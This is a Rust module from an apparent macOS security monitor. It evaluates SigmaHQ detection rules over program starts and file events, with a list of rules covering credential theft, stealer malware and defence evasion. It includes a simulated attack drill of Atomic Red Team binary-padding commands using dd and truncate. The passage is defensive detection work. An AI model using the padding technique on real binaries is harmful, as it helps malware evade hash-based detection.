//! Published Sigma rules for macOS, evaluated in memory over one program start or one file
//! created or renamed: a process rule (`process_creation`) is asked only about a program start,
//! a file rule (`file_event`) only about a file event.
//!
//! The rules are SigmaHQ's, unmodified, in `rules/sigma/` with its NOTICE, and compiled into
//! the program. What Sigma means is the evaluator's to say, `sigma-rust`'s: conditions,
//! modifiers, case folding, what an absent field or `null` means. Nothing here re-implements
//! it; the tests below pin how it behaves on the shipped rules where the specification leaves
//! room. What is ours is small: which Sigma field each part of an event is, which rules
//! this level can evaluate, and naming the ones it cannot, so none is skipped silently and none
//! is counted among the rules that watch when it does not.
//!
//! Nothing is stored and nothing is printed here.

use serde_json::{Value as Json, json};
use serde_norway::Value;
use std::collections::{BTreeMap, BTreeSet};

/// Where the shipped rules come from, and the commit they were copied at.
pub const SOURCE: &str = "https://github.com/SigmaHQ/sigma";
pub const COMMIT: &str = "d7c9da10c170a6988d68ebdf2c9f7bd8782b7c55";
pub const COMMIT_DATE: &str = "2026-11-10";
pub const LICENCE: &str = "DRL-1.1";
/// The folder they are in, relative to the repository; a rule's `file` is relative to it.
pub const FOLDER: &str = "rules/sigma";

macro_rules! shipped {
    ($($path:literal,)*) => {
        &[$(($path, include_str!(concat!("../rules/sigma/", $path))),)*]
    };
}

/// Every shipped rule: its path under `FOLDER` and its text. A test holds this list to the
/// folder, so a file added there and not here fails it.
pub const SHIPPED: &[(&str, &str)] = shipped![
    "rules-emerging-threats/2025/Malware/Atomic-MacOS-Stealer/file_event_macos_malware_amos_persistence.yml",
    "rules-emerging-threats/2025/Malware/Atomic-MacOS-Stealer/proc_creation_macos_malware_amos_curl_post.yml",
    "rules-emerging-threats/2026/Malware/Axios-NPM-Compromise/file_event_macos_axios_npm_compromise_indicators.yml",
    "rules-emerging-threats/2026/Malware/Axios-NPM-Compromise/proc_creation_macos_axios_npm_compromise_indicators.yml",
    "rules-threat-hunting/macos/file/file_event/file_event_macos_python_path_configuration_files.yml",
    "rules-threat-hunting/macos/process_creation/proc_creation_macos_pbpaste_execution.yml",
    "rules/macos/file_event/file_event_macos_emond_launch_daemon.yml",
    "rules/macos/file_event/file_event_macos_susp_startup_item_created.yml",
    "rules/macos/process_creation/proc_creation_macos_applescript.yml",
    "rules/macos/process_creation/proc_creation_macos_base64_decode.yml",
    "rules/macos/process_creation/proc_creation_macos_binary_padding.yml",
    "rules/macos/process_creation/proc_creation_macos_change_file_time_attr.yml",
    "rules/macos/process_creation/proc_creation_macos_chflags_hidden_flag.yml",
    "rules/macos/process_creation/proc_creation_macos_clear_system_logs.yml",
    "rules/macos/process_creation/proc_creation_macos_clipboard_access_via_osascript.yml",
    "rules/macos/process_creation/proc_creation_macos_create_account.yml",
    "rules/macos/process_creation/proc_creation_macos_create_hidden_account.yml",
    "rules/macos/process_creation/proc_creation_macos_creds_from_keychain.yml",
    "rules/macos/process_creation/proc_creation_macos_csrutil_disable.yml",
    "rules/macos/process_creation/proc_creation_macos_csrutil_status.yml",
    "rules/macos/process_creation/proc_creation_macos_disable_security_tools.yml",
    "rules/macos/process_creation/proc_creation_macos_dscl_add_user_to_admin_group.yml",
    "rules/macos/process_creation/proc_creation_macos_dseditgroup_add_to_admin_group.yml",
    "rules/macos/process_creation/proc_creation_macos_dsenableroot_enable_root_account.yml",
    "rules/macos/process_creation/proc_creation_macos_file_and_directory_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_find_cred_in_files.yml",
    "rules/macos/process_creation/proc_creation_macos_gui_input_capture.yml",
    "rules/macos/process_creation/proc_creation_macos_hdiutil_create.yml",
    "rules/macos/process_creation/proc_creation_macos_hdiutil_mount.yml",
    "rules/macos/process_creation/proc_creation_macos_installer_susp_child_process.yml",
    "rules/macos/process_creation/proc_creation_macos_ioreg_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_jamf_susp_child.yml",
    "rules/macos/process_creation/proc_creation_macos_jamf_usage.yml",
    "rules/macos/process_creation/proc_creation_macos_jxa_in_memory_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_launchctl_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_local_account.yml",
    "rules/macos/process_creation/proc_creation_macos_local_groups.yml",
    "rules/macos/process_creation/proc_creation_macos_network_service_scanning.yml",
    "rules/macos/process_creation/proc_creation_macos_network_sniffing.yml",
    "rules/macos/process_creation/proc_creation_macos_nscurl_usage.yml",
    "rules/macos/process_creation/proc_creation_macos_office_susp_child_processes.yml",
    "rules/macos/process_creation/proc_creation_macos_osacompile_runonly_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_payload_decoded_and_decrypted.yml",
    "rules/macos/process_creation/proc_creation_macos_persistence_via_plistbuddy.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_access_tools_meshagent_arguments.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_access_tools_renamed_meshagent_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_access_tools_teamviewer_incoming_connection.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_system_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_schedule_task_job_cron.yml",
    "rules/macos/process_creation/proc_creation_macos_screencapture.yml",
    "rules/macos/process_creation/proc_creation_macos_security_software_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_space_after_filename.yml",
    "rules/macos/process_creation/proc_creation_macos_split_file_into_pieces.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_browser_child_process.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_execution_macos_script_editor.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_find_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_histfile_operations.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_in_memory_download_and_compile.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_macos_firmware_activity.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_system_network_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_suspicious_applet_behaviour.yml",
    "rules/macos/process_creation/proc_creation_macos_swvers_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_sysadminctl_add_user_to_admin_group.yml",
    "rules/macos/process_creation/proc_creation_macos_sysadminctl_enable_guest_account.yml",
    "rules/macos/process_creation/proc_creation_macos_sysctl_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_system_network_connections_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_system_profiler_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_system_shutdown_reboot.yml",
    "rules/macos/process_creation/proc_creation_macos_tail_base64_decode_from_image.yml",
    "rules/macos/process_creation/proc_creation_macos_tmutil_delete_backup.yml",
    "rules/macos/process_creation/proc_creation_macos_tmutil_disable_backup.yml",
    "rules/macos/process_creation/proc_creation_macos_tmutil_exclude_file_from_backup.yml",
    "rules/macos/process_creation/proc_creation_macos_wizardupdate_malware_infection.yml",
    "rules/macos/process_creation/proc_creation_macos_xattr_gatekeeper_bypass.yml",
    "rules/macos/process_creation/proc_creation_macos_xcsset_malware_infection.yml",
];

/// One program start: the event level's, `crate::events::ProcessStart`, read from
/// `eslogger`'s `exec`. Which Sigma field each of its parts is, and why, is
/// `crate::events::SIGMA_FIELDS`, beside where the line is read. A file created or renamed is
/// `crate::events::FileEvent`, read from `create` and `rename`, its fields
/// `crate::events::FILE_SIGMA_FIELDS`.
pub use crate::events::{FileEvent, ProcessStart};

/// The kinds of event a rule's logsource must name for this level to evaluate it: Sigma's
/// `process_creation` for a program start, `file_event` for a file created or renamed.
pub const CATEGORY: &str = "process_creation";
pub const FILE_CATEGORY: &str = "file_event";

/// The kind of event a rule is about, by its logsource category. A program start is asked
/// only of process rules, a file event only of file rules.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Kind {
    Process,
    File,
}

impl Kind {
    fn of(category: &str) -> Option<Kind> {
        match category {
            CATEGORY => Some(Kind::Process),
            FILE_CATEGORY => Some(Kind::File),
            _ => None,
        }
    }

    pub fn category(self) -> &'static str {
        match self {
            Kind::Process => CATEGORY,
            Kind::File => FILE_CATEGORY,
        }
    }

    /// Sigma's names for what an event of this kind gives.
    pub fn fields(self) -> Vec<&'static str> {
        match self {
            Kind::Process => FIELDS.iter().map(|(n, _)| *n).collect(),
            Kind::File => FILE_FIELDS.iter().map(|(n, _)| *n).collect(),
        }
    }

    /// Where this kind's fields begin among the values of `Subject::forms`: a program start's
    /// first, then a file event's, so that one search over the values serves both kinds.
    fn offset(self) -> usize {
        match self {
            Kind::Process => 0,
            Kind::File => FIELDS.len(),
        }
    }
}

/// Every field either kind gives, in the order of `Subject::forms`.
const ALL_FIELDS: usize = FIELDS.len() + FILE_FIELDS.len();

/// An event the rules are asked about.
#[derive(Clone, Copy, Debug)]
pub enum Subject<'a> {
    Start(&'a ProcessStart),
    File(&'a FileEvent),
}

impl<'a> From<&'a ProcessStart> for Subject<'a> {
    fn from(s: &'a ProcessStart) -> Self {
        Subject::Start(s)
    }
}

impl<'a> From<&'a FileEvent> for Subject<'a> {
    fn from(f: &'a FileEvent) -> Self {
        Subject::File(f)
    }
}

impl Subject<'_> {
    pub fn kind(&self) -> Kind {
        match self {
            Subject::Start(_) => Kind::Process,
            Subject::File(_) => Kind::File,
        }
    }

    /// The values of every field, `ALL_FIELDS` long, the other kind's absent. A file event
    /// gives one set of values for each name its file has (`FileEvent::names`): a rule matches
    /// the event when it matches any of them.
    pub fn forms(&self) -> Vec<Vec<Option<String>>> {
        match self {
            Subject::Start(s) => {
                let mut values: Vec<Option<String>> =
                    FIELDS.iter().map(|(_, take)| take(s)).collect();
                values.resize(ALL_FIELDS, None);
                vec![values]
            }
            Subject::File(f) => f
                .names()
                .iter()
                .map(|name| {
                    let mut values = vec![None; FIELDS.len()];
                    values.extend(FILE_FIELDS.iter().map(|(_, take)| take(f, name)));
                    values
                })
                .collect(),
        }
    }
}

/// The evaluator's event for one set of values of a kind: a field the event does not give
/// stays absent, and an absent field matches nothing.
fn event_of(kind: Kind, values: &[Option<String>]) -> sigma_rust::Event {
    let mut event = sigma_rust::Event::new();
    for (i, name) in kind.fields().into_iter().enumerate() {
        if let Some(value) = &values[kind.offset() + i] {
            event.insert(name, value.clone());
        }
    }
    event
}

/// The drill: Atomic Red Team's tests ffe2346c-abd5-4b45-a713-bf5f1ebd573a and
/// e22a9e89-69c7-410f-a473-e6c212cd2292 (T1027.001), as the program starts their commands
/// make. `sh` runs each line; the redirection to the padded file is the shell's, so the
/// program gets only these arguments. Each must raise "Binary Padding - MacOS". The summary
/// runs them through this binary's evaluator, so it says whether the evaluator works here.
pub const DRILL_RULE: &str = "95361ce5-c891-4b0a-87ca-e24607884a96";
pub const DRILL: [(&str, &str, &[&str]); 4] = [
    (
        "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
        "/bin/dd",
        &["dd", "if=/dev/zero", "bs=1", "count=1"],
    ),
    (
        "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
        "/bin/dd",
        &["dd", "if=/dev/random", "bs=1", "count=1"],
    ),
    (
        "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
        "/bin/dd",
        &["dd", "if=/dev/urandom", "bs=1", "count=1"],
    ),
    (
        "e22a9e89-69c7-410f-a473-e6c212cd2292",
        "/usr/bin/truncate",
        &["truncate", "-s", "+1", "/tmp/evil-binary"],
    ),
];

/// A drill start: started by `sh`, as Atomic Red Team's `sh` executor starts it.
pub fn drill_start(image: &str, args: &[&str]) -> ProcessStart {
    ProcessStart {
        executable: image.to_string(),
        args: args.iter().map(|a| a.to_string()).collect(),
        parent_executable: Some("/bin/sh".to_string()),
        ..ProcessStart::default()
    }
}

/// Sigma's names for what a program start gives, and how each is taken from it, and the same
/// for a file event. A field a rule names that is not among its kind's is one this level does
/// not have.
pub use crate::events::FILE_SIGMA_FIELDS as FILE_FIELDS;
pub use crate::events::SIGMA_FIELDS as FIELDS;

/// How bad, Sigma's levels; their names are OCSF's severity names.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum Level {
    Informational,
    Low,
    Medium,
    High,
    Critical,
}

const LEVELS: [(&str, Level); 5] = [
    ("informational", Level::Informational),
    ("low", Level::Low),
    ("medium", Level::Medium),
    ("high", Level::High),
    ("critical", Level::Critical),
];

impl Level {
    /// Whether a match of a rule of this level raises a finding. Sigma's specification says a
    /// `high` rule "should trigger an internal alert" and that lower levels are rarely an
    /// incident; every lower match is counted only.
    pub fn raises(self) -> bool {
        self >= Level::High
    }

    pub fn as_str(self) -> &'static str {
        LEVELS
            .iter()
            .find(|(_, l)| *l == self)
            .map_or("", |(n, _)| n)
    }
}

/// How mature a rule is, Sigma's statuses.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Status {
    Stable,
    Test,
    Experimental,
    Deprecated,
    Unsupported,
}

const STATUSES: [(&str, Status); 5] = [
    ("stable", Status::Stable),
    ("test", Status::Test),
    ("experimental", Status::Experimental),
    ("deprecated", Status::Deprecated),
    ("unsupported", Status::Unsupported),
];

impl Status {
    /// How sure a finding from a rule of this status is, as OCSF's confidence names it. A
    /// published rule is written from attacks seen elsewhere and was never tuned to this Mac,
    /// where coding agents and build tools start `grep`, `curl`, `osascript` and `dd` all day,
    /// so no status makes a match sure. SigmaHQ calls a rule `stable` once it has been used in
    /// several environments for some time with its false positives listed: medium. `test`,
    /// which is 67 of the 69 macOS rules, says false positives may still be found, and
    /// `experimental` that it is new: low. No published false-positive rate for these rules
    /// on developer Macs was found (`docs/research/event-level.md`). So a finding from a
    /// shipped `test` rule is never urgent: it is shown, and the app does not alert on it.
    pub fn confidence(self) -> &'static str {
        match self {
            Status::Stable => "medium",
            Status::Test | Status::Experimental | Status::Deprecated | Status::Unsupported => "low",
        }
    }

    pub fn as_str(self) -> &'static str {
        STATUSES
            .iter()
            .find(|(_, s)| *s == self)
            .map_or("", |(n, _)| n)
    }
}

/// What a rule says about itself. Text from the rule, returned as data.
#[derive(Debug)]
pub struct Meta {
    pub id: String,
    /// The id of a finding's rule when this rule raises one: `sigma:<id>`.
    pub finding_rule: String,
    pub title: String,
    pub level: Level,
    pub status: Status,
    /// The rule's `author` field. The Detection Rule License asks that a message made from a
    /// match keeps it.
    pub author: Option<String>,
    /// ATT&CK technique ids from its `attack.t…` tags, as `T1027.001`.
    pub techniques: Vec<String>,
    /// The rule's `description`: what it looks for, in its author's words.
    pub description: Option<String>,
}

/// What this level does with a rule. Whether a rule it can evaluate watches this Mac now is
/// another question, the level's state and what its collector records:
/// `crate::status::rules_section`.
#[derive(Debug, PartialEq)]
pub enum Placement {
    /// Every part of the rule can match an event of its kind.
    Evaluated,
    /// Evaluated, but these alternatives of its selections never match here, for a field this
    /// level does not have; the rest of the rule can.
    InPart(Vec<Branch>),
    NotEvaluated(Reason),
}

/// One alternative of a selection that never matches at this level.
#[derive(Debug, PartialEq)]
pub struct Branch {
    pub selection: String,
    /// The fields it needs that an event of its kind does not give.
    pub fields: Vec<String>,
}

/// Why a rule is not evaluated. The codes are a closed vocabulary.
#[derive(Debug, PartialEq)]
pub enum Reason {
    /// It is about another kind of event, named by its logsource category, which this level
    /// does not read.
    NeedsEvents(String),
    /// A selection it cannot do without needs fields an event of its kind does not give.
    NeedsFields(Vec<String>),
    /// It searches the whole message for keywords, and this level has fields, not messages.
    KeywordSearch,
    /// It could not be read, with what the parser said.
    NotParsed(String),
}

impl Reason {
    pub fn code(&self) -> &'static str {
        match self {
            Reason::NeedsEvents(_) => "needs_events",
            Reason::NeedsFields(_) => "needs_fields",
            Reason::KeywordSearch => "keyword_search",
            Reason::NotParsed(_) => "not_parsed",
        }
    }
}

/// One shipped rule, read once.
pub struct Loaded {
    /// Its path under `FOLDER`.
    pub file: &'static str,
    /// `None` only when it could not be parsed.
    pub meta: Option<Meta>,
    pub placement: Placement,
    /// The kind of event it is about; `None` for a kind this level does not read, or a rule
    /// that could not be read.
    pub kind: Option<Kind>,
    rule: Option<sigma_rust::Rule>,
    /// What an event must hold for the rule to be able to match it.
    need: Need,
}

impl Loaded {
    /// Evaluated, wholly or in part, over events of this kind.
    fn asked_of(&self, kind: Kind) -> bool {
        self.kind == Some(kind) && !matches!(self.placement, Placement::NotEvaluated(_))
    }
}

/// A rule an event matched.
pub struct Match<'a> {
    pub file: &'static str,
    pub meta: &'a Meta,
    pub kind: Kind,
}

impl Match<'_> {
    /// What a message made from this match carries, the rule's authors included as the
    /// Detection Rule License asks.
    pub fn json(&self) -> Json {
        let m = self.meta;
        json!({
            "file": self.file,
            "events": self.kind.category(),
            "id_text": crate::status::text(&m.id),
            "title_text": crate::status::text(&m.title),
            "level": m.level.as_str(),
            "status": m.status.as_str(),
            "techniques": m.techniques,
            "author_text": m.author.as_deref().map(crate::status::text),
        })
    }
}

/// How the rule of a finding a published rule raised begins: `sigma:<the rule's id>`.
pub const FINDING_PREFIX: &str = "sigma:";

pub struct Rules {
    pub rules: Vec<Loaded>,
    /// Which texts the rules need in each field, searched for once per start; `None` asks
    /// every rule.
    texts: Option<Texts>,
}

static SHIPPED_RULES: std::sync::OnceLock<Rules> = std::sync::OnceLock::new();

impl Rules {
    /// Every shipped rule, parsed once per process, not at each reading: the watcher reads
    /// program starts every thirty seconds for as long as it runs.
    pub fn shipped() -> &'static Rules {
        SHIPPED_RULES.get_or_init(|| Rules::load(SHIPPED))
    }

    /// A rule by its id, among those that could be read.
    pub fn by_id(&self, id: &str) -> Option<&Loaded> {
        self.rules
            .iter()
            .find(|l| l.meta.as_ref().is_some_and(|m| m.id == id))
    }

    pub fn load(files: &[(&'static str, &'static str)]) -> Rules {
        let mut texts = BTreeMap::new();
        let rules = files
            .iter()
            .map(|(file, text)| load(file, text, &mut texts))
            .collect();
        Rules {
            rules,
            texts: Texts::new(texts),
        }
    }

    /// The rules this event matches, in the order they are shipped. Only rules of its kind
    /// that are evaluated, wholly or in part, are asked, and of them only those whose `Need`
    /// the event holds: a rule whose need it does not hold cannot match it, so the answer is
    /// the one `evaluate_each` gives by asking every rule of its kind.
    pub fn evaluate<'e>(&self, subject: impl Into<Subject<'e>>) -> Vec<Match<'_>> {
        let subject = subject.into();
        let kind = subject.kind();
        let mut hit = vec![false; self.rules.len()];
        for values in subject.forms() {
            let asked = self.asked(kind, &values);
            let event = event_of(kind, &values);
            for (i, l) in self.rules.iter().enumerate() {
                if !hit[i] && asked.iter().any(|a| std::ptr::eq(*a, l)) {
                    hit[i] = l.rule.as_ref().is_some_and(|r| r.is_match(&event));
                }
            }
        }
        self.matched(kind, &hit)
    }

    /// The rules marked in `hit`, in the order they are shipped.
    fn matched(&self, kind: Kind, hit: &[bool]) -> Vec<Match<'_>> {
        self.rules
            .iter()
            .zip(hit)
            .filter(|(_, hit)| **hit)
            .filter_map(|(l, _)| {
                Some(Match {
                    file: l.file,
                    meta: l.meta.as_ref()?,
                    kind,
                })
            })
            .collect()
    }

    /// The rules to ask about an event of `kind` with these values, as `Subject::forms` gives
    /// them: those of its kind evaluated, wholly or in part, whose need the values hold.
    fn asked(&self, kind: Kind, values: &[Option<String>]) -> Vec<&Loaded> {
        let held = self.texts.as_ref().map(|t| t.held(values));
        self.rules
            .iter()
            .filter(|l| l.asked_of(kind))
            .filter(|l| held.as_ref().is_none_or(|h| l.need.holds(h)))
            .collect()
    }

    /// The same answer as `evaluate`, by asking every rule of the event's kind: the reference
    /// the faster path is held to.
    #[cfg(test)]
    pub fn evaluate_each<'e>(&self, subject: impl Into<Subject<'e>>) -> Vec<Match<'_>> {
        let subject = subject.into();
        let kind = subject.kind();
        let mut hit = vec![false; self.rules.len()];
        for values in subject.forms() {
            let event = event_of(kind, &values);
            for (i, l) in self.rules.iter().enumerate() {
                hit[i] |= l.asked_of(kind) && l.rule.as_ref().is_some_and(|r| r.is_match(&event));
            }
        }
        self.matched(kind, &hit)
    }

    /// The rules evaluated in full over events of `kind`.
    pub fn evaluated(&self, kind: Kind) -> usize {
        self.rules
            .iter()
            .filter(|l| l.kind == Some(kind) && l.placement == Placement::Evaluated)
            .count()
    }

    /// The summary of `immune rules --json`: how many are shipped, evaluated, evaluated in part
    /// and not evaluated, with the rules behind each number.
    pub fn summary_json(&self) -> Json {
        let named = |l: &Loaded| {
            let mut v = json!({
                "file": l.file,
                "id_text": l.meta.as_ref().map(|m| crate::status::text(&m.id)),
                "title_text": l.meta.as_ref().map(|m| crate::status::text(&m.title)),
                "level": l.meta.as_ref().map(|m| m.level.as_str()),
                "status": l.meta.as_ref().map(|m| m.status.as_str()),
                "events": l.kind.map(Kind::category),
            });
            match &l.placement {
                Placement::Evaluated => {}
                Placement::InPart(branches) => {
                    v["never_matches"] = branches
                        .iter()
                        .map(|b| {
                            json!({
                                "selection_text": crate::status::text(&b.selection),
                                "fields_text": texts(&b.fields),
                            })
                        })
                        .collect();
                }
                Placement::NotEvaluated(reason) => {
                    v["reason"] = json!(reason.code());
                    match reason {
                        Reason::NeedsEvents(c) => v["events_text"] = crate::status::text(c),
                        Reason::NeedsFields(f) => v["fields_text"] = texts(f),
                        Reason::KeywordSearch => {}
                        Reason::NotParsed(said) => v["said_text"] = crate::status::text(said),
                    }
                }
            }
            v
        };
        let (evaluated, in_part, not_evaluated) = self.groups();
        json!({
            "source": {
                "url": SOURCE,
                "commit": COMMIT,
                "commit_date": COMMIT_DATE,
                "licence": LICENCE,
                "folder": FOLDER,
            },
            "events": CATEGORY,
            "fields": Kind::Process.fields(),
            "file_events": FILE_CATEGORY,
            "file_fields": Kind::File.fields(),
            "totals": {
                "shipped": self.rules.len(),
                "evaluated": evaluated.len(),
                "in_part": in_part.len(),
                "not_evaluated": not_evaluated.len(),
            },
            "evaluated": evaluated.into_iter().map(named).collect::<Vec<_>>(),
            "in_part": in_part.into_iter().map(named).collect::<Vec<_>>(),
            "not_evaluated": not_evaluated.into_iter().map(named).collect::<Vec<_>>(),
            "drill": DRILL.iter().map(|(test, image, args)| {
                let matches = self.evaluate(&drill_start(image, args));
                json!({
                    "atomic_test": test,
                    "image": image,
                    "arguments": args,
                    "must_raise": DRILL_RULE,
                    "raised": matches.iter().any(|m| m.meta.id == DRILL_RULE),
                    "matches": matches.iter().map(Match::json).collect::<Vec<_>>(),
                })
            }).collect::<Vec<_>>(),
        })
    }

    /// How many drill starts raise the rule they must.
    fn drill_raised(&self) -> usize {
        DRILL
            .iter()
            .filter(|(_, image, args)| {
                let matches = self.evaluate(&drill_start(image, args));
                matches.iter().any(|m| m.meta.id == DRILL_RULE)
            })
            .count()
    }

    /// The same summary for a person, a line each, with how many times each rule matched in
    /// the last day where the store says.
    pub fn summary_lines(&self, last_day: Option<&BTreeMap<String, i64>>) -> Vec<String> {
        let (evaluated, in_part, not_evaluated) = self.groups();
        let row = |l: &Loaded| match &l.meta {
            Some(m) => {
                let n = last_day.and_then(|d| d.get(&m.id)).copied().unwrap_or(0);
                let matched = if n > 0 {
                    format!(" · matched {} in the last day", times(n))
                } else {
                    String::new()
                };
                format!("  {:<13} {}{matched}", m.level.as_str(), m.title)
            }
            None => format!("  {:<13} {}", "?", l.file),
        };
        let mut lines = vec![
            format!(
                "Sigma rules for macOS: {} shipped, from SigmaHQ at {} of {}.",
                self.rules.len(),
                &COMMIT[..12],
                COMMIT_DATE
            ),
            format!(
                "Evaluated in full: {}, {} on every program start and {} on every file created or renamed",
                evaluated.len(),
                self.evaluated(Kind::Process),
                self.evaluated(Kind::File)
            ),
        ];
        lines.extend(evaluated.into_iter().map(row));
        lines.push(format!(
            "Evaluated in part, some alternatives never match here: {}",
            in_part.len()
        ));
        for l in in_part {
            lines.push(row(l));
            if let Placement::InPart(branches) = &l.placement {
                for b in branches {
                    lines.push(format!(
                        "      {} needs {}, which {} does not give",
                        b.selection,
                        b.fields.join(", "),
                        given_by(l.kind)
                    ));
                }
            }
        }
        lines.push(format!("Not evaluated: {}", not_evaluated.len()));
        for l in not_evaluated {
            lines.push(row(l));
            if let Placement::NotEvaluated(reason) = &l.placement {
                lines.push(format!(
                    "      {}",
                    match reason {
                        Reason::NeedsEvents(c) => format!("needs {c} events"),
                        Reason::NeedsFields(f) => format!(
                            "needs {}, which {} does not give",
                            f.join(", "),
                            given_by(l.kind)
                        ),
                        Reason::KeywordSearch => "searches whole messages for keywords".into(),
                        Reason::NotParsed(said) => format!("could not be read: {said}"),
                    }
                ));
            }
        }
        lines.push(format!(
            "Drill, Atomic Red Team T1027.001: {} of {} program starts raise {}.",
            self.drill_raised(),
            DRILL.len(),
            self.rules
                .iter()
                .filter_map(|l| l.meta.as_ref())
                .find(|m| m.id == DRILL_RULE)
                .map_or(DRILL_RULE, |m| m.title.as_str())
        ));
        lines
    }

    /// The rules split by placement: evaluated, in part, not evaluated, each from the most
    /// severe down, in the order they are shipped within a level.
    pub fn groups(&self) -> (Vec<&Loaded>, Vec<&Loaded>, Vec<&Loaded>) {
        let mut all: Vec<&Loaded> = self.rules.iter().collect();
        all.sort_by_key(|l| std::cmp::Reverse(l.meta.as_ref().map(|m| m.level)));
        let mut groups = (Vec::new(), Vec::new(), Vec::new());
        for l in all {
            match l.placement {
                Placement::Evaluated => groups.0.push(l),
                Placement::InPart(_) => groups.1.push(l),
                Placement::NotEvaluated(_) => groups.2.push(l),
            }
        }
        groups
    }
}

/// What gives a rule's fields, for a person: "a program start" or "a file event".
pub fn given_by(kind: Option<Kind>) -> &'static str {
    match kind {
        Some(Kind::File) => "a file event",
        _ => "a program start",
    }
}

/// How many times, as a number with its thousands separated.
pub fn times(n: i64) -> String {
    crate::view::counted(n, "time", "times")
}

fn texts(items: &[String]) -> Json {
    items.iter().map(|s| crate::status::text(s)).collect()
}

/// Reads one rule. The YAML is parsed once; the evaluator builds its rule from it, and the
/// level, status and shape of the detection, which the evaluator keeps to itself, are read
/// from it to place the rule.
fn load(file: &'static str, text: &str, texts: &mut Wanted) -> Loaded {
    let not_parsed = |said: String| Loaded {
        file,
        meta: None,
        placement: Placement::NotEvaluated(Reason::NotParsed(said)),
        kind: None,
        rule: None,
        need: Need::Any,
    };
    let yaml: Value = match serde_norway::from_str(text) {
        Ok(v) => v,
        Err(e) => return not_parsed(e.to_string()),
    };
    let rule: sigma_rust::Rule = match serde_norway::from_value(yaml.clone()) {
        Ok(rule) => rule,
        Err(e) => return not_parsed(e.to_string()),
    };
    let meta = match meta(&rule, &yaml) {
        Ok(m) => m,
        Err(said) => return not_parsed(said),
    };
    let kind = Kind::of(yaml["logsource"]["category"].as_str().unwrap_or_default());
    Loaded {
        file,
        meta: Some(meta),
        placement: place(&yaml),
        kind,
        rule: Some(rule),
        need: kind.map_or(Need::Any, |kind| need(&yaml, kind, texts)),
    }
}

// ---- What a start must hold for a rule to be able to match it. ----
//
// Most starts match no rule, and asking the evaluator is most of the time spent on a start:
// it folds both sides of every comparison anew. So each rule is reduced, once, to a condition
// a start must meet for the rule to be able to match it, made only of texts that must occur in
// a field. One pass of a multi-pattern search over each field of a start then says which texts
// it holds, and only a rule whose condition holds is asked. The answer is the evaluator's.
//
// The condition is derived from the rule as the evaluator reads it (`sigma-rust` 0.7.0): a
// string value, whatever its modifier among `contains`, `startswith`, `endswith`, `cased` and
// `all`, becomes a wildcard pattern whose literal runs must each occur, in that order, in the
// value folded one character at a time with `char::to_lowercase`, or as it is under `cased`; a
// field the start does not give matches nothing; a selection is all of its fields, a list of
// maps one of them; `not` binds closer than `and`, and `and` than `or`; `1 of` a name pattern
// is one of every selection the pattern could name, `all of` all of those it surely names, the
// names that begin with what stands before its last `*`. Each text here is a run
// of a value cut at `*`, `?` and `\`, folded the same way, so it lies within one such run and
// must occur wherever the value matches. The first run must also begin the field when nothing
// stands before it, neither a wildcard nor the `*` that `contains` and `endswith` put there,
// and the last must end it when nothing stands after it. Whatever is not read here exactly,
// another modifier, a value that is not a string, a keyword list, a condition with any other
// word, and whatever stands under `not`, needs nothing, and such a rule is asked as before.

/// Where in a field's value a text must be.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
enum Place {
    Within,
    Start,
    End,
}

/// The texts the rules need, each numbered: in which field, where, and the text folded.
type Wanted = BTreeMap<(usize, Place, String), usize>;

/// A condition a start must meet for a rule to be able to match it.
#[derive(Clone, Debug, PartialEq)]
enum Need {
    /// Nothing can be said: the rule is asked.
    Any,
    /// The rule matches no start.
    Never,
    /// The field's value, folded, holds this text where it must, by its number in `Wanted`.
    Holds(usize),
    All(Vec<Need>),
    OneOf(Vec<Need>),
}

impl Need {
    fn holds(&self, held: &[bool]) -> bool {
        match self {
            Need::Any => true,
            Need::Never => false,
            Need::Holds(i) => held[*i],
            Need::All(all) => all.iter().all(|n| n.holds(held)),
            Need::OneOf(any) => any.iter().any(|n| n.holds(held)),
        }
    }
}

/// All of them, made as small as what they say allows.
fn all(parts: Vec<Need>) -> Need {
    let mut kept = Vec::new();
    for p in parts {
        match p {
            Need::Never => return Need::Never,
            Need::Any => {}
            p => kept.push(p),
        }
    }
    match kept.len() {
        0 => Need::Any,
        1 => kept.remove(0),
        _ => Need::All(kept),
    }
}

/// One of them, made as small as what they say allows.
fn one_of(parts: Vec<Need>) -> Need {
    let mut kept = Vec::new();
    for p in parts {
        match p {
            Need::Any => return Need::Any,
            Need::Never => {}
            p => kept.push(p),
        }
    }
    match kept.len() {
        0 => Need::Never,
        1 => kept.remove(0),
        _ => Need::OneOf(kept),
    }
}

/// A value folded as the evaluator folds what it compares: each character on its own.
fn fold(s: &str) -> String {
    if s.is_ascii() {
        s.to_ascii_lowercase()
    } else {
        s.chars().flat_map(char::to_lowercase).collect()
    }
}

/// The need of a rule about events of `kind`, from its YAML. `texts` numbers each text a field
/// must hold.
fn need(yaml: &Value, kind: Kind, texts: &mut Wanted) -> Need {
    let Some(detection) = yaml["detection"].as_mapping() else {
